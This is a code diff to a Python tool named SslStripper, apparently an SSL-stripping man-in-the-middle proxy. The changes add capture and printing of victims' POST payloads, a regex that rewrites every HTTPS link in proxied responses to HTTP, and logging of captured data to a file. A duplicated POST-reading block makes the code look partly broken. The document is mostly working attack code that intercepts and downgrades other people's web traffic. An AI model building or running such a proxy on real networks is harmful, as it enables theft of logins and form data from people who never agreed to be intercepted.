@@ -1,5 +1,6 @@
 import os
 import sys
+import re
 import time
 from datetime import datetime
 from http.server import HTTPServer, SimpleHTTPRequestHandler
@@ -27,11 +28,19 @@ class SslStripper:
                 host = self.headers.get("Host")
 
                 if "localhost" in host.lower():
-                    return  # Ignore requests to localhost
+                    return
 
-                path = urlparse(self.path).path
+                path = self.path #urlparse(self.path).path
+                print(colored(path, "red"))
 
                 print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
+                
+                # Print payload to if POST request
+                if method == "POST":
+                    content_length = int(self.headers.get("Content-Length", 0))
+                    payload = self.rfile.read(content_length)
+
+                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
 
                 # Print payload to if POST request
                 if method == "POST":
@@ -48,6 +57,9 @@ class SslStripper:
 
                 # Extract payload from response
                 payload = response.content
+
+                # Downgrade al HTTPS URLs to HTTP
+                payload = re.sub(b"https://", b"http://", payload)
 
                 if logging:  # If logging is enabled for SslStripper class
                     with open("captures.log", "a") as f:  # Log payload to file
@@ -154,10 +166,10 @@ class SslStripper:
             print(colored(f"[SSL] Error: Port {self.port} is already in use. Terminate the process and retry.", "red"))
             return
 
-        while not self.is_port_open():
-            print(colored(f"[SSL] Port {self.port} is closed. Opening port and retrying...", "light_grey"))
-            self.open_port()
-            time.sleep(3)
+        # while not self.is_port_open():
+        #     print(colored(f"[SSL] Port {self.port} is closed. Opening port and retrying...", "light_grey"))
+        #     self.open_port()
+        #     time.sleep(3)
 
         print(colored(f"[SSL] Starting webserver on port {self.port}...", "light_grey"))
         self.server.serve_forever()
